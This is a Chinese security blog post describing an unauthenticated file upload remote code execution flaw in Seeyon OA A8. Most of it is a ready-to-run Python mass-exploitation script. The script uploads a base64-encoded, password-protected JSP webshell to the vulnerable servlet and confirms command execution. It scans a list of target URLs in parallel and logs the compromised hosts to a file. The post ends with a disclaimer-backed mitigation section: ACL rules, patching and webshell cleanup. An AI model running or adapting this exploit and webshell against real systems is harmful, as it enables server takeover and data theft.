{"title":"致远seeyon-OA系统脆弱性列表","slug":"网安大类/Vulnerable/OA/致远seeyon-OA系统脆弱性列表","date":"2019-08-01T01:32:30.000Z","updated":"2022-03-30T05:02:09.707Z","url":"2019/8-1-416.html","path":"api/articles/2019/8-1-416.html.json","covers":null,"content":"<p>[TOC]</p>\n<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h4><h4 id=\"RCE-远程代码执行\"><a href=\"#RCE-远程代码执行\" class=\"headerlink\" title=\"RCE-远程代码执行\"></a>RCE-远程代码执行</h4><p><strong>致远 OA A8 协同管理软件被曝存在远程代码执行漏洞0day</strong><br>漏洞成因：<br>致远 A8+ 某些版本系统，存在远程任意文件上传文件上传漏洞，并且无需登录即可触发。攻击者构造恶意文件，成功利用漏洞后可造成Getshell。同时该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。</p>\n<p>已验证影响版本：</p>\n<ul>\n<li>A8 V7.0 SP3</li>\n<li>A8 V6.1 SP2</li>\n<li>(V6.1 SP1 验证尚不存在，其他版本未验证)</li>\n</ul>\n<p>POC:<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Wednesday, 26 June 2019</span></span><br><span class=\"line\"><span class=\"comment\"># Author:nianhua</span></span><br><span class=\"line\"><span class=\"comment\"># Blog:https://github.com/nian-hua/</span></span><br><span class=\"line\"><span class=\"comment\"># python3 版本</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing <span class=\"keyword\">import</span> Pool, Manager</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_payload</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    headers = &#123;<span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/x-www-form-urlencoded'</span>&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    payload = <span class=\"string\">\"REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U=\"</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    payload = base64.b64decode(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        r = requests.post(url + <span class=\"string\">'/seeyon/htmlofficeservlet'</span>, data=payload)</span><br><span class=\"line\">        r = requests.get(</span><br><span class=\"line\">            url + <span class=\"string\">'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd%20+/c+echo+wangming'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"wangming\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> url</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove_control_chars</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    control_chars = <span class=\"string\">''</span>.join(map(chr, list(range(<span class=\"number\">0</span>,<span class=\"number\">32</span>)) + list(range(<span class=\"number\">127</span>,<span class=\"number\">160</span>))))</span><br><span class=\"line\">    </span><br><span class=\"line\">    control_char_re = re.compile(<span class=\"string\">'[%s]'</span> % re.escape(control_chars))</span><br><span class=\"line\"> </span><br><span class=\"line\">    s = control_char_re.sub(<span class=\"string\">''</span>, s)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'http'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> s:</span><br><span class=\"line\"> </span><br><span class=\"line\">        s = <span class=\"string\">'http://'</span> + s</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">savePeopleInformation</span><span class=\"params\">(url, queue)</span>:</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    newurl = send_payload(url)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> newurl != <span class=\"number\">0</span>:</span><br><span class=\"line\"> </span><br><span class=\"line\">        fw = open(<span class=\"string\">'loophole.txt'</span>, <span class=\"string\">'a'</span>)</span><br><span class=\"line\">        fw.write(newurl + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">        fw.close()</span><br><span class=\"line\"> </span><br><span class=\"line\">    queue.put(url)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    pool = Pool(<span class=\"number\">10</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">    queue = Manager().Queue()</span><br><span class=\"line\"> </span><br><span class=\"line\">    fr = open(<span class=\"string\">'url.txt'</span>, <span class=\"string\">'r'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">    lines = fr.readlines()</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\"> </span><br><span class=\"line\">        url = remove_control_chars(i)</span><br><span class=\"line\"> </span><br><span class=\"line\">        pool.apply_async(savePeopleInformation, args=(url, queue,))</span><br><span class=\"line\"> </span><br><span class=\"line\">    allnum = len(lines)</span><br><span class=\"line\"> </span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"> </span><br><span class=\"line\">        print(queue.get())</span><br><span class=\"line\"> </span><br><span class=\"line\">        num += <span class=\"number\">1</span></span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> num &gt;= allnum:</span><br><span class=\"line\"> </span><br><span class=\"line\">            fr.close()</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">\"__main__\"</span> == __name__:</span><br><span class=\"line\"> </span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure></p>\n<p>缓解措施：</p>\n<ul>\n<li>漏洞位置为：/seeyon/htmlofficeservlet可以对该地址配置ACL规则。</li>\n<li>或者联系官方获取补丁程序，官网地址：<a href=\"http://www.seeyon.com/Info/constant.html\" target=\"_blank\" rel=\"noopener\">http://www.seeyon.com/Info/constant.html</a></li>\n</ul>\n<p>临时修补方案如下：<br>1、配置URL访问控制策略；<br>2、在公网部署的致远A8+服务器，通过ACL禁止外网对“/seeyon/htmlofficeservlet”路径的访问；<br>3、对OA服务器上的网站后门文件进行及时查杀。</p>\n","comments":true,"excerpt":"[TOC]注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。","categories":[{"name":"OA指纹","path":"api/categories/OA指纹.json"}],"tags":[{"name":"seeyon","path":"api/tags/seeyon.json"}]}